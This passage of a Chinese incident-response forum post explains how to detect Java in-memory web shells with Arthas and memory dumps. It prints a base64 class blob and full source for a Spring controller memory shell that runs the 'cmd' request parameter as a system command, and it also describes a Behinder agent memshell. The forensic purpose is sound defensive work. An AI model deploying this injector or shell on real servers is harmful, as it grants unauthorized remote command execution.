Jpbmc7KVYBAAVmbHVzaAEAF015RXZhbENsYXNzX2luamVjdHNoZWxsACEAJAAlAAAAARAQACYAJwAAAAIAAQAoACkAAQAqAAAATAACAAMAAAAKKiu1AAEqtwACsQAAAAIAKwAAAAoAAgAAAC0ACQAuACwAAAAgAAMAAAAKAC0AMAAAAAAACgAmACcAAQAAAAoAMQAyAAIAAQAzADQAAgAqAAAB2gAGAAgAAADCuAADwAAEwAAEtgAFTLgAA8AABMAABLYABk0rEge5AAgCAE4txgCdLLkACQEAOgQSCjoFEgu4AAy2AA0SDrYAD5kAIbsAEFkGvQARWQMSElNZBBITU1kFLVO3ABQ6BqcAHrsAEFkGvQARWQMSFVNZBBIWU1kFLVO3ABQ6BrsAF1kZBrYAGLYAGbcAGhIbtgAcOgcZB7YAHZkACxkHtgAepwAFGQU6BRkHtgAfGQQZBbYAIBkEtgAhGQS2ACKnAAU6BLEAAQAnALwAvwAjAAMAKwAAAEoAEgAAADIADQAzABoANQAjADYAJwA4AC8AOQAzADsAQwA8AGEAPgB8AEAAkgBBAKYAQgCrAEMAsgBEALcARQC8AEgAvwBGAMEASgAsAAAAZgAKAF4AAwA1ADYABgAvAI0ANwA4AAQAMwCJADkAMgAFAHwAQAA1ADYABgCSACoAOgA7AAcAwQAAADwAPQAEAAAAwgAtADAAAAANALUAPgA/AAEAGgCoAEAAQQACACMAnwBCADIAAwBDAAAAQgAG/wBhAAYHAEQHAEUHAEYHAEcHAEgHAEcAAPwAGgcASfwAJQcASkEHAEf/ABoABAcARAcARQcARgcARwABBwBLAQBMAAAABAABACMAAgBNAAAAAgBOAC8AAAAKAAEAJAB3AC4AAQ==
```

要被加载的外部类实现：

```php
import java.io.IOException;  
import java.io.PrintWriter;  
import java.lang.reflect.Method;  
import java.util.Scanner;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import org.springframework.web.bind.annotation.RequestMethod;  
import org.springframework.web.context.WebApplicationContext;  
import org.springframework.web.context.request.RequestContextHolder;  
import org.springframework.web.context.request.ServletRequestAttributes;  
import org.springframework.web.servlet.mvc.condition.ConsumesRequestCondition;  
import org.springframework.web.servlet.mvc.condition.HeadersRequestCondition;  
import org.springframework.web.servlet.mvc.condition.ParamsRequestCondition;  
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;  
import org.springframework.web.servlet.mvc.condition.ProducesRequestCondition;  
import org.springframework.web.servlet.mvc.condition.RequestCondition;  
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;  
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;  
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;  
​  
public class MyEvalClass\_injectshell {  
    public MyEvalClass\_injectshell() {  
    }  
​  
    public void Injectshell() throws NoSuchMethodException, IOException {  
        HttpServletResponse response \= ((ServletRequestAttributes)((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes())).getResponse();  
        WebApplicationContext context \= (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);  
        RequestMappingHandlerMapping mappingHandlerMapping \= (RequestMappingHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);  
        Method method \= MyEvalClass\_injectshell.Evil.class.getMethod("test");  
        PatternsRequestCondition url \= new PatternsRequestCondition(new String\[\]{"/hellos"});  
        RequestMethodsRequestCondition ms \= new RequestMethodsRequestCondition(new RequestMethod\[0\]);  
        RequestMappingInfo info \= new RequestMappingInfo(url, ms, (ParamsRequestCondition)null, (HeadersRequestCondition)null, (ConsumesRequestCondition)null, (ProducesRequestCondition)null, (RequestCondition)null);  
        MyEvalClass\_injectshell.Evil injectToController \= new MyEvalClass\_injectshell.Evil("xxx");  
        mappingHandlerMapping.registerMapping(info, injectToController, method);  
        System.out.println("测试xxxxxx");  
        response.getWriter().println("inject success");  
    }  
​  
    public static void main(String\[\] args) {  
        System.out.println("success");  
    }  
​  
    public class Evil {  
        public Evil(String xxx) {  
        }  
​  
        public void test() throws Exception {  
            HttpServletRequest request \= ((ServletRequestAttributes)((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes())).getRequest();  
            HttpServletResponse response \= ((ServletRequestAttributes)((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes())).getResponse();  
            String command \= request.getParameter("cmd");  
            if (command != null) {  
                try {  
                    PrintWriter printWriter \= response.getWriter();  
                    String o \= "";  
                    ProcessBuilder p;  
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {  
                        p \= new ProcessBuilder(new String\[\]{"cmd.exe", "/c", command});  
                    } else {  
                        p \= new ProcessBuilder(new String\[\]{"/bin/sh", "-c", command});  
                    }  
​  
                    Scanner c \= (new Scanner(p.start().getInputStream())).useDelimiter("\\\\A");  
                    o \= c.hasNext() ? c.next() : o;  
                    c.close();  
                    printWriter.write(o);  
                    printWriter.flush();  
                    printWriter.close();  
                } catch (Exception var8) {  
                }  
            }  
​  
        }  
    }  
}  
​
```

内部类实现：

```php
//  
// Source code recreated from a .class file by IntelliJ IDEA  
// (powered by FernFlower decompiler)  
//  
​  
import java.io.PrintWriter;  
import java.util.Scanner;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import org.springframework.web.context.request.RequestContextHolder;  
import org.springframework.web.context.request.ServletRequestAttributes;  
​  
public class MyEvalClass\_injectshell$Evil {  
    public MyEvalClass\_injectshell$Evil(MyEvalClass\_injectshell this$0, String xxx) {  
        this.this$0 \= this$0;  
    }  
​  
    public void test() throws Exception {  
        HttpServletRequest request \= ((ServletRequestAttributes)((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes())).getRequest();  
        HttpServletResponse response \= ((ServletRequestAttributes)((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes())).getResponse();  
        String command \= request.getParameter("cmd");  
        if (command != null) {  
            try {  
                PrintWriter printWriter \= response.getWriter();  
                String o \= "";  
                ProcessBuilder p;  
                if (System.getProperty("os.name").toLowerCase().contains("win")) {  
                    p \= new ProcessBuilder(new String\[\]{"cmd.exe", "/c", command});  
                } else {  
                    p \= new ProcessBuilder(new String\[\]{"/bin/sh", "-c", command});  
                }  
​  
                Scanner c \= (new Scanner(p.start().getInputStream())).useDelimiter("\\\\A");  
                o \= c.hasNext() ? c.next() : o;  
                c.close();  
                printWriter.write(o);  
                printWriter.flush();  
                printWriter.close();  
            } catch (Exception var8) {  
            }  
        }  
​  
    }  
}  
​
```

成功注入：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-5c861280be74f081fad88f1198617909ec0cb328.png)

测试使用：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-ef97438b43cccd436b10fde43b32fb1080dbd810.png)

排查：

这里是通过jar直接起的环境，所以用不了jsp的那个脚本了，所以主要就是agent的思路和内存dump的思路了

#### 方法1

使用arthas排查，方法和上面一样；

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-57a2b8728d131ab095824fedff7c04edf05a8255.png)

步骤，非指向性排查的时候：

1、过常见容易被注入组件，如：Controller、Interceptor等;

2、然后排查一些敏感词类名，如：shell、eval、memshell等

3、重点查看是否出现匿名内部类的相关类；

这里通过Eval的关键词是可以找到的，如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-ea8e35bf825705a1385d39ef876f6c4b5e0129e9.png)

但是如果攻击者，把利用过程中这些类的类名都泛化了呢，比如使用随机数字或英文字母代替了，我们该如何排查呢？

这种情况下，我们更多的需要从指向性排查入手，比如这个例子里面，我们通过和业务沟通，并且结合流量侧，发现攻击者大概率是通过`BadControl：\loadclass`这个接口打入的内存马，我们就要对症下药，可以看到这里的业务逻辑是使用自定义的Classloader去加载web请求传入的class字节码，所以我们排查的时候可以尝试从加载器入手；

arthas里面查看Classloader相关情况，如下图，我们可以看到，的确存在两个被BadControl里面自定义加载器加载的类：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-bd26362652d4725b86487892ab73f67f5683e51a.png)

找到该classloader的hashcode

`classloader -l`

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-5d91fe16d77b64b85f06a80472dea087ff37cfd8.png)

找到被该classloader加载的类

`sc -d * --classloader <hashcode>`

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-c1236cac36d9e5bd30bf69fb8b18d1e3c23c4dc3.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-1f0883f0f62b9ed14a9d7e190d50a4e7aa0a3030.png)

查看对应类逻辑，可以看到是往mappingHandlerMapping里面加了一个RequestMappingInfo，对应的url是：`/hellos`，调用的controller逻辑是Evil类的test()方法；

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-00021740e49d175bd9328d969cec44811bc3b612.png)

#### 方法2

dump内存排查

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-97d1dba5a7e88f2cc60635370d401e0e530777ce.png)

**在知道被利用的接口是一个任意字节码加载接口的时候，我们可以直接对症下药，查看内存中是否遗留相关恶意字节码的base64编码（接口做了编码解码）**

**类字节码的base64头形式一般是:`yv66vg`（cafebabe00转化而来）；**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-076895c4a2144bb8e42903278a2611833960a656.png)

如下，一共发现16个地方，其中基本十多处都是我们可以看到就是传入的恶意类字节码，展现形式略有不同，有的是web请求里面遗留的，有的是执行逻辑的遗留；

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-558fc557d142101d991f9a270b0e24d610c01197.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-a81302e052f592f85beae6fc7864f8ae7c1f4ab5.png)

dump下来，还原class字节码文件，反编译，如下通过这番操作，我们拿到了注入内存马逻辑的class字节码实现：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-03a951be1cb599db065b5a911125cd1198ae7f94.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-f2d9bf2a727394edb798f54d0e2d57af6032413a.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-985c6d4660fb989d55d6eb565de334208f102475.png)

同样的，这里通过之前的直接找内存马类的字节码文件，也是可以找到的，可能需要一些排查时间；

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-51d8dbb028505548f37df9e6fb0427381f5b11b7.png)

#### 重点

最后这里我们简单提下方法1中的查看内存中是否遗留相关恶意字节码头的base64编码，yv66vg这个东西；抛开业务场景来说这个其实是非常好用的，为什么这么说呢，因为我们常见的冰蝎、哥斯拉等webshell管理工具，其原理实现任意代码执行，是通过继承classloader，利用其definessclass方法来实现字节码加载，获取实例，随之调用其内置的方法，从而实现任意代码执行；那么这个字节码内容怎么传输呢，一般的webshell管理工具都是通过base64或aes+base64这种方法来做的，所以攻击者利用webshell管理工具注入内存马的时候（不管是注入马使用的类，还是内存马对应的类本身），内存处理里面就会留存相关蛛丝马迹；

除此之外，还有一些其他场景会有这种情况，比如攻击者为了实现一些免杀，会使用一些硬编码操作，把一些类实现硬编码到一些加载逻辑里面：

如下是利用这个技巧拿到攻击者的注入内存马的类，还原后拿到的硬编码的内存马逻辑：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-da2da9177e0e22be8fd67f5b8f6fe98829e5ade5.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-b804e28e26d21fb79eea74712832be6d50c34ef5.png)

### 3、java agent注入jar实现的内存马（冰蝎agent注入）

这里我们拿rebeyond 师傅最早写的memshell：<https://github.com/rebeyond/memShell>；这个项目举例，或者直接使用冰蝎内置的memshell，一样的;

核心就是对指定类的指定方法进行动态修改（详细原理可以参考这个[文章](https://minhangxiaohui.github.io/2024/09/04/%E5%BF%86%E5%BE%80%E6%98%94_JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E7%94%9F/)），如下是memshell项目中修改的类（`org.apache.cataline.core.applicationFilterChain的internalDoFilter`方法）

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-e941a31fa8ee012738324e44ee183437d5b4ec54.png)

以tomcat为例,使用冰蝎注入agent内存马：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-5fabde7d6b718f388571200f14098d80859aa98a.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-64855021726e15c3e1cf2691b294b9c2c4802671.png)

排查：

排查之前我们简单区分下上面第一个内存马（tomcat中动态注入servlet组件）和这个的区别，第一个实现是创建新的组件，现在这个是对老组件进行篡改（这里说老组件也不太恰当，因为不一定是组件，可能是一些流程处理逻辑类，只要这个类的某个方法中可以直接或间接的拿到StandardConetext对象），并且尽量不影响其原本的执行逻辑；

#### 方法1：

使用arthas：

这种就直接上来就是指向性排查即可，比如冰蝎4内置的agent内存马里面agentmain方法如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-654d18f945d2a35e31d088c8a887d83fcd1c4688.png)

其对类做过滤，找的这几个类我们挨个过即可，直接jad拿其反编译后的字节码，重点看方法被改没；

```php
javax.servlet.ServletRequest     .service()  
javax.servlet.http.HttpServlet    .service()  
jakarta.servlet.http.HttpServlet   .service()  

weblogic:  
weblogic.servlet.internal.ServletStubImpl   .execute()
```

排查结果如下，可以看到，`javax.servlet.http.HttpServlet`的service方法被插入了内存马逻辑，判断uri是否匹配`/agentmemshell`;并且这里我们注意冰蝎在实现内存马的逻辑里面做了一个硬编码内置类,用来解码；

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-dc6cbe1032b1287d9e66f6488567a6889bebce56.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-6d203cd1388e3010e00afcc95b6819ebf3a54a02.png)

#### 方法2：

dump 内存分析：

这里直接搜`yv66v`，dump还原字节码，反编译，拿到其内置的解密类：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-be726a0792421746571b7559077860f2a2ce58b7.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-04cf7309c4fc441d98dfa55d63d6b9b8518f6b4b.png)

通过 请求记录，get or post 查，也可以看到内存马连接记录：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-0c91f706794ccc766202d31d04b1c5dad91fd0b1.png)

0x03 总结
=======

不管是哪种内存马，只要打了，一定就会有痕迹，只要有痕迹就有迹可循，找到其实现，只不过是排查方式方法的问题；

主流的排查方法就两种：

> agent 以毒攻毒
> 
> dump 内存分析，让内存落地

其中agent的排查方法最好是使用arthas，毕竟大厂工具兼容性有保障，这种排查主要依靠应急人员过硬的专业技术能力，能够分析不同环境下不同思路的内存马、以及业务接口逻辑，从而制定合适的排查过滤方式；

dump内存的话，相对来说对应急人员的要求比较低，三板斧抡出来即可；但是有时有奇效；

笔者才疏学浅，若文中存在错误观点，欢迎斧正。